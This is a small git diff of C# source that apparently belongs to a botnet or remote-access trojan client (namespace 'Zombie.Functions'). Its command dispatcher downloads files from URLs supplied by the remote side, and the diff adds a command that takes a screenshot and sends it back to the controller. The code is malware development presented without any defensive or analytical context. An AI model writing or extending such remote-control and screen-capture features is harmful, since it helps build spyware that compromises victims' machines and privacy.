@@ -22,6 +22,9 @@ namespace Zombie.Functions
                 case CommandFlags.ZombieDownloadFileRequest:
                     Client.Send(Download.FromURL(reader.ReadString(), reader.ReadString()));
                     break;
+                case CommandFlags.Screenshot:
+                    Client.Send(Screenshot.Take());
+                    break;
                 default:
                     throw new ArgumentException("No command corresponding to the given value.");
 
